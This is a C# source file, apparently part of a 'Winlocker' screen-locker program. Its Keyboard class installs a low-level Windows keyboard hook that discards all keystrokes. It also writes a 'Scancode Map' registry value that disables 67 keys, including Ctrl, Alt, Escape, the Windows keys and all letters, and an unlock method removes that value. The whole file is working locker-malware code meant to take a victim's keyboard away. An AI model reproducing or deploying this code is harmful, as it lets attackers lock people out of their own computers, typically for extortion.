using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace Winlocker.Models
{
    public class Keyboard
    {
        private delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        [DllImport("user32.dll", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi)]
        private static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);

        [DllImport("user32.dll")]
        private static extern int UnhookWindowsHookEx(int hHook);

        [DllImport("user32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi)]
        private static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        private static int intLLKey;
        const int WH_KEYBOARD_LL = 13;

        private struct KBDLLHOOKSTRUCT
        {
            int time;
            int scanCode;
            int dwExtraInfo;
            public int flags;
            public int vkCode;
        }

        private static int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = true;
            if (blnEat) return 1;
            else return CallNextHookEx(0, nCode, wParam, ref lParam);
        }

        static LowLevelKeyboardProcDelegate del;

        public static void KeyboardHook()
        {
            del = new LowLevelKeyboardProcDelegate(LowLevelKeyboardProc);
            intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, del, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
        }

        public static void KeyboardLock()
        {
            RegistryKey reg;
            reg = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);
            byte[] binary = new byte[] {
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x43, 0x00, 0x00, 0x00, //67 buttons
                
                //Function buttons
                0x00, 0x00, 0x3B, 0x00, //F1
                0x00, 0x00, 0x3C, 0x00, //F2
                0x00, 0x00, 0x3D, 0x00, //F3
                0x00, 0x00, 0x3E, 0x00, //F4
                0x00, 0x00, 0x3F, 0x00, //F5
                0x00, 0x00, 0x40, 0x00, //F6
                0x00, 0x00, 0x41, 0x00, //F7
                0x00, 0x00, 0x42, 0x00, //F8
                0x00, 0x00, 0x43, 0x00, //F9
                0x00, 0x00, 0x44, 0x00, //F10
                0x00, 0x00, 0x57, 0x00, //F11
                0x00, 0x00, 0x58, 0x00, //F12

                //Special buttons
                0x00, 0x00, 0x1C, 0xE0, //Numpad Enter
                0x00, 0x00, 0x0E, 0x00, //Backspace
                0x00, 0x00, 0x3A, 0x00, //Caps Lock
                0x00, 0x00, 0x53, 0xE0, //Delete
                0x00, 0x00, 0x1C, 0x00, //Enter
                0x00, 0x00, 0x01, 0x00, //Escape
                0x00, 0x00, 0x38, 0x00, //Left Alt
                0x00, 0x00, 0x1D, 0x00, //Left Ctrl
                0x00, 0x00, 0x2A, 0x00, //Left Shift
                0x00, 0x00, 0x5B, 0xE0, //Left Windows
                0x00, 0x00, 0x45, 0x00, //Numpad lock
                0x00, 0x00, 0x38, 0xE0, //Right Alt
                0x00, 0x00, 0x1D, 0xE0, //Right Ctrl
                0x00, 0x00, 0x36, 0x00, //Right Shift
                0x00, 0x00, 0x5C, 0xE0, //Right Windows
                0x00, 0x00, 0x39, 0x00, //Space
                0x00, 0x00, 0x0F, 0x00, //Tab
                0x00, 0x00, 0x63, 0xE0, //Fn

                //Key buttons
                0x00, 0x00, 0x0B, 0x00, //Key_0
                0x00, 0x00, 0x02, 0x00, //Key_1
                0x00, 0x00, 0x03, 0x00, //Key_2
                0x00, 0x00, 0x04, 0x00, //Key_3
                0x00, 0x00, 0x05, 0x00, //Key_4
                0x00, 0x00, 0x06, 0x00, //Key_5
                0x00, 0x00, 0x07, 0x00, //Key_6
                0x00, 0x00, 0x08, 0x00, //Key_7
                0x00, 0x00, 0x09, 0x00, //Key_8
                0x00, 0x00, 0x0A, 0x00, //Key_9
                0x00, 0x00, 0x1E, 0x00, //Key_A
                0x00, 0x00, 0x30, 0x00, //Key_B
                0x00, 0x00, 0x2E, 0x00, //Key_C
                0x00, 0x00, 0x20, 0x00, //Key_D
                0x00, 0x00, 0x12, 0x00, //Key_E
                0x00, 0x00, 0x21, 0x00, //Key_F
                0x00, 0x00, 0x22, 0x00, //Key_G
                0x00, 0x00, 0x23, 0x00, //Key_H
                0x00, 0x00, 0x17, 0x00, //Key_I
                0x00, 0x00, 0x24, 0x00, //Key_J
                0x00, 0x00, 0x25, 0x00, //Key_K
                0x00, 0x00, 0x26, 0x00, //Key_L
                0x00, 0x00, 0x32, 0x00, //Key_M
                0x00, 0x00, 0x31, 0x00, //Key_N
                0x00, 0x00, 0x18, 0x00, //Key_O
                0x00, 0x00, 0x19, 0x00, //Key_P
                0x00, 0x00, 0x10, 0x00, //Key_Q
                0x00, 0x00, 0x13, 0x00, //Key_R
                0x00, 0x00, 0x1F, 0x00, //Key_S
                0x00, 0x00, 0x14, 0x00, //Key_T
                0x00, 0x00, 0x16, 0x00, //Key_U
                0x00, 0x00, 0x2F, 0x00, //Key_V
                0x00, 0x00, 0x11, 0x00, //Key_W
                0x00, 0x00, 0x2D, 0x00, //Key_X
                0x00, 0x00, 0x15, 0x00, //Key_Y
                0x00, 0x00, 0x2C, 0x00, //Key_Z
                0x00, 0x00, 0x00, 0x00
            };
            reg.SetValue("Scancode Map", binary, RegistryValueKind.Binary);
            reg.Close();
        }

        public static void KeyboardUnlock()
        {
            RegistryKey reg;
            reg = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);
            reg.DeleteValue("Scancode Map", true);
            reg.Close();
        }
    }
}
